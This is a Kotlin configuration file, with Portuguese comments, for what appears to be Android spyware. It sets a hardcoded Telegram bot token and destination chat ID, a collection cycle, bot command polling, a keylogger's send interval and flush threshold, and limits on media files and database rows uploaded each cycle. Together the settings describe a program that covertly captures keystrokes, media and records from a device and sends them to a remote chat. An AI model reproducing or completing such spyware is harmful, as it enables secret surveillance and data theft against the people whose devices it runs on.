package com.example.monitor

object Config {

    /** Token do bot (BotFather). */
    const val BOT_TOKEN = "8123456789:AAHk9xQ2mPzL7vTn4RbY1cW8sD3fG6hJ0kL"

    /** ID do chat/grupo de destino. */
    const val CHAT_ID = "259684657"

    /** Intervalo do ciclo completo de coleta. */
    const val INTERVAL_MS = 15 * 60 * 1000L

    /** Intervalo de varredura de comandos do bot. */
    const val POLL_MS = 20 * 1000L

    /** Intervalo e gatilho de envio do keylogger. */
    const val KEYLOG_INTERVAL_MS = 60 * 1000L
    const val KEYLOG_FLUSH_CHARS = 400

    /** Quantos arquivos de mídia enviar por ciclo. */
    const val MEDIA_LIMIT = 5
    const val MEDIA_MAX_BYTES = 5L * 1024 * 1024

    /** Quantos registros puxar por consulta. */
    const val ROW_LIMIT = 150

    fun configurado(): Boolean =
        BOT_TOKEN.isNotBlank() && !BOT_TOKEN.startsWith("COLOQUE")
}
